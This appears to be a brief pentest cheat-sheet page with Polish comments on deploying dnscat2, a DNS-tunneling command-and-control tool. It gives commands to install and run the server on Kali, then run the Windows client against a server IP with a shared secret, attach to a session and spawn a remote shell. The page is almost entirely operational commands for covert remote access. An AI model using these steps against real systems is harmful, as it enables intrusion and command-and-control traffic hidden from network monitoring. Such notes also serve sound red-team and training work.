---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# DNSCAT

**Kali**

```python
git clone https://github.com/sbrun/dnscat2.git
cd dnscat2/server
gem install bundler && bundle install

#uruchamiamy
ruby dnscat2.rb
```

**Windows**

```python
#pobieramy dnscat2 (plik: dnscat2-v0.07-client-win32.zip)
https://downloads.skullsecurity.org/dnscat2
🔑 – password

#uruchamiamy
dnscat2-v0.07-client-win32.exe --dns=server=10.20.10.4 --secret=<secret z serwera>

#sprawdzamy dsotępne sesje
sessions

#podłączenie do 1 sesji
session -i 1

#wywołujemy shella
shell
```
